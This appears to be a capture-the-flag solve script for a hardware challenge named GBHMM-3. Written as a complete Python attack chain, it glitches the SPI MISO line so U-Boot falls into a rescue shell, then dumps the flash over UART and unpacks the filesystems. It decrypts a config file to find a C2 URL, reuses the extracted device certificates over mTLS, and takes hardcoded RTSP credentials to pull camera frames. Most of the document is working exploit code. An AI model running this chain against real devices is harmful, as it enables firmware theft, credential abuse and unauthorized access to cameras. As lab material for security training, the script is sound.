#!/usr/bin/env python3
"""
GBHMM-3 end-to-end solve. (modified with ai by inframakers)

Chain:
  1. UART glitch SPI MISO during U-Boot's firmware load to drop into rescue shell
  2. sf probe / sf read / md to dump 8 MB SPI flash over UART
  3. Slice firmware into MTD partitions, unsquashfs USR and jefferson CFG
  4. XOR-decrypt /mnt/config/.node.db with device.key.pem to recover the C2 URL
  5. mTLS to the C2 with device.pem + device.key.pem, find the online camera
  6. Pull the RTSP creds from /usr/share/rtsp_config.xml in USR
  7. Capture frames from the camera's RTSP stream and OCR the flag
"""

import argparse
import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FW_SIZE = 0x800000
RAM_BASE = 0x80000000
DUMP_CHUNK = 0x10000

# Partition offsets straight from the kernel cmdline in uart_bootlog.txt
PARTITIONS = {
    "UBT": (0x000000, 0x040000),
    "ENV": (0x038000, 0x008000),
    "NA1": (0x040000, 0x008000),
    "NA2": (0x040000, 0x008000),
    "K": (0x048000, 0x1A0000),
    "RT": (0x1E8000, 0x100000),
    "CFG": (0x2E8000, 0x040000),
    "USR": (0x328000, FW_SIZE - 0x328000),
}

FLAG_RE = re.compile(rb"BZHCTF\{[^}]+\}")

UART_BASE = [
    {"from": "device_tx", "to": "adapter_rx"},
    {"from": "adapter_tx", "to": "device_rx"},
    {"from": "device_gnd", "to": "adapter_gnd"},
]
UART_GLITCH = UART_BASE + [{"from": "spi_2", "to": "spi_4"}]


def info(msg):
    print(f"[*] {msg}", flush=True)


def success(msg):
    print(f"[+] {msg}", flush=True)


def warn(msg):
    print(f"[-] {msg}", flush=True)


class NC:
    def __init__(self, host, port):
        self.s = socket.socket()
        self.s.settimeout(2)
        self.s.connect((host, port))
        self.buf = b""

    def send(self, data):
        self.s.sendall((data + "\n").encode())

    def recv_until(self, marker, timeout=30):
        deadline = time.monotonic() + timeout
        while marker not in self.buf:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            self.s.settimeout(min(2, remaining))
            try:
                chunk = self.s.recv(65536)
            except socket.timeout:
                continue
            if not chunk:
                break
            self.buf += chunk
        idx = self.buf.find(marker)
        if idx == -1:
            data, self.buf = self.buf, b""
            raise TimeoutError(
                f"marker {marker!r} not seen; last bytes: {data[-200:]!r}"
            )
        data = self.buf[: idx + len(marker)]
        self.buf = self.buf[idx + len(marker) :]
        return data


def set_wiring(api, conns):
    r = requests.post(api + "/wiring", json={"connections": conns}, timeout=10)
    r.raise_for_status()


def parse_md_block(text):
    """Parse one `md` output block, return list of (addr, bytes)."""
    out = []
    for line in text.splitlines():
        line = line.strip()
        if line.startswith("=>"):
            line = line[2:].strip()
        m = re.match(r"^([0-9a-fA-F]{8}):\s*((?:[0-9a-fA-F]{8}\s*)+)$", line)
        if not m:
            continue
        addr = int(m.group(1), 16)
        words = m.group(2).split()
        data = b"".join(bytes.fromhex(w) for w in words)
        out.append((addr, data))
    return out


def dump_firmware(host, port, api):
    info("Wiring UART (TX/RX/GND only)")
    set_wiring(api, UART_BASE)

    nc = NC(host, port)
    nc.recv_until(b"> ")

    info("Powering device on")
    nc.send("on")
    nc.recv_until(b"> ")

    info("Booting and waiting for SPI firmware load")
    nc.send("b")
    nc.recv_until(b"Loading firmware: [")

    info("Glitching SPI MISO -> GND")
    set_wiring(api, UART_GLITCH)

    info("Waiting for U-Boot rescue shell")
    nc.recv_until(b"=> ", timeout=60)
    success("Dropped into U-Boot")

    info("Removing SPI glitch so we can read flash")
    set_wiring(api, UART_BASE)
    time.sleep(0.3)

    nc.send("sf probe")
    nc.recv_until(b"=> ")
    nc.send(f"sf read {hex(RAM_BASE)} 0x0 {hex(FW_SIZE)}")
    nc.recv_until(b"=> ")

    info(f"Dumping {FW_SIZE // 1024} KB via md (chunk = {DUMP_CHUNK} bytes)")
    firmware = bytearray(FW_SIZE)
    seen = bytearray(FW_SIZE)
    total = FW_SIZE // DUMP_CHUNK
    t0 = time.monotonic()

    for i, offset in enumerate(range(0, FW_SIZE, DUMP_CHUNK)):
        addr = RAM_BASE + offset
        nc.send(f"md {hex(addr)} {hex(DUMP_CHUNK)}")
        text = nc.recv_until(b"=> ", timeout=30).decode(errors="ignore")
        for line_addr, data in parse_md_block(text):
            mem_off = line_addr - RAM_BASE
            if 0 <= mem_off and mem_off + len(data) <= FW_SIZE:
                firmware[mem_off : mem_off + len(data)] = data
                for k in range(len(data)):
                    seen[mem_off + k] = 1

        pct = (i + 1) / total * 100
        elapsed = time.monotonic() - t0
        rate = (i + 1) * DUMP_CHUNK / 1024 / max(elapsed, 0.01)
        print(
            f"\r    [{pct:5.1f}%] offset={hex(offset)}  {rate:.1f} KB/s",
            end="",
            flush=True,
        )
    print()

    missing = FW_SIZE - sum(seen)
    if missing:
        warn(f"{missing} bytes missing from dump")
    else:
        success("Full firmware captured")
    return bytes(firmware)


def slice_partitions(firmware, workdir):
    parts = {}
    for name, (off, sz) in PARTITIONS.items():
        path = os.path.join(workdir, f"{name}.bin")
        with open(path, "wb") as f:
            f.write(firmware[off : off + sz])
        parts[name] = path
    return parts


def run(cmd, **kw):
    r = subprocess.run(cmd, capture_output=True, **kw)
    if r.returncode != 0:
        raise RuntimeError(
            f"{cmd[0]} failed ({r.returncode})\nstdout: {r.stdout!r}\nstderr: {r.stderr!r}"
        )
    return r


def extract_squashfs(src, dst):
    if os.path.exists(dst):
        shutil.rmtree(dst)
    run(["unsquashfs", "-no-xattrs", "-d", dst, src])


def extract_jffs2(src, dst):
    if os.path.exists(dst):
        shutil.rmtree(dst)
    run(["jefferson", "-d", dst, src])


def xor_decrypt(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def find_online_camera(html):
    # Dashboard pattern: `online: i === 2` (zero-based card index).
    m = re.search(r"online:\s*i\s*===\s*(\d+)", html)
    if m:
        idx = int(m.group(1)) + 1
        return f"fr-relay-{idx:02d}"
    raise RuntimeError("could not locate the online camera in C2 dashboard")


def capture_frames(rtsp_url, outdir, count=30):
    os.makedirs(outdir, exist_ok=True)
    for p in os.listdir(outdir):
        os.remove(os.path.join(outdir, p))
    cmd = [
        "ffmpeg",
        "-hide_banner",
        "-loglevel",
        "error",
        "-rtsp_transport",
        "tcp",
        "-i",
        rtsp_url,
        "-frames:v",
        str(count),
        os.path.join(outdir, "frame_%03d.png"),
    ]
    run(cmd)
    return sorted(
        os.path.join(outdir, f) for f in os.listdir(outdir) if f.endswith(".png")
    )


def ocr_flag(frames):
    import pytesseract
    from PIL import Image

    for frame in frames:
        img = Image.open(frame)
        text = pytesseract.image_to_string(img).encode()
        m = FLAG_RE.search(text)
        if m:
            return m.group(0).decode()
    return None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="localhost")
    parser.add_argument("--port", type=int, default=1337)
    parser.add_argument("--api", default="http://localhost")
    parser.add_argument(
        "--workdir",
        default=None,
        help="Reuse a previous dump (skips UART step if firmware.bin present)",
    )
    parser.add_argument(
        "--frames", type=int, default=30, help="RTSP frames to grab for OCR"
    )
    args = parser.parse_args()

    workdir = args.workdir or tempfile.mkdtemp(prefix="gbhmm3_")
    os.makedirs(workdir, exist_ok=True)
    info(f"Workdir: {workdir}")

    fw_path = os.path.join(workdir, "firmware.bin")
    if os.path.exists(fw_path):
        success(f"Reusing cached firmware: {fw_path}")
        firmware = open(fw_path, "rb").read()
    else:
        firmware = dump_firmware(args.host, args.port, args.api)
        with open(fw_path, "wb") as f:
            f.write(firmware)
        success(f"Saved firmware: {fw_path}")

    info("Slicing MTD partitions")
    parts = slice_partitions(firmware, workdir)

    usr_dir = os.path.join(workdir, "usr_fs")
    cfg_dir = os.path.join(workdir, "cfg_fs")

    info("Unpacking USR (squashfs)")
    extract_squashfs(parts["USR"], usr_dir)

    info("Unpacking CFG (jffs2)")
    extract_jffs2(parts["CFG"], cfg_dir)

    info("XOR-decrypting /mnt/config/.node.db with device.key.pem")
    key = open(os.path.join(cfg_dir, "device.key.pem"), "rb").read()
    node_db = open(os.path.join(cfg_dir, ".node.db"), "rb").read()
    decrypted = xor_decrypt(node_db, key)
    m = re.search(rb'"c2"\s*:\s*"([^"]+)"', decrypted)
    if not m:
        raise RuntimeError("c2 URL not found in decrypted .node.db")
    c2 = m.group(1).decode()
    success(f"C2: {c2}")

    info("Querying C2 dashboard with mTLS (device.pem)")
    cert = (
        os.path.join(cfg_dir, "device.pem"),
        os.path.join(cfg_dir, "device.key.pem"),
    )
    resp = requests.get(c2, cert=cert, verify=False, timeout=15)
    resp.raise_for_status()
    cam = find_online_camera(resp.text)
    success(f"Online camera: {cam}")

    rtsp_xml = open(os.path.join(usr_dir, "share", "rtsp_config.xml")).read()
    user = re.search(r"<username>([^<]+)</username>", rtsp_xml).group(1)
    pwd = re.search(r"<password>([^<]+)</password>", rtsp_xml).group(1)
    sport = re.search(r"<serverport>([^<]+)</serverport>", rtsp_xml).group(1)
    host = c2.split("://", 1)[-1].rstrip("/")
    rtsp_url = f"rtsp://{user}:{pwd}@{host}:{sport}/botnet-cam-{cam}"
    success(f"RTSP: {rtsp_url}")

    info(f"Capturing {args.frames} frames")
    frames_dir = os.path.join(workdir, "frames")
    frames = capture_frames(rtsp_url, frames_dir, count=args.frames)

    info("OCR'ing frames")
    flag = ocr_flag(frames)
    if not flag:
        warn("No flag matched in any frame — inspect frames/ manually")
        sys.exit(1)

    success(f"FLAG: {flag}")


if __name__ == "__main__":
    main()
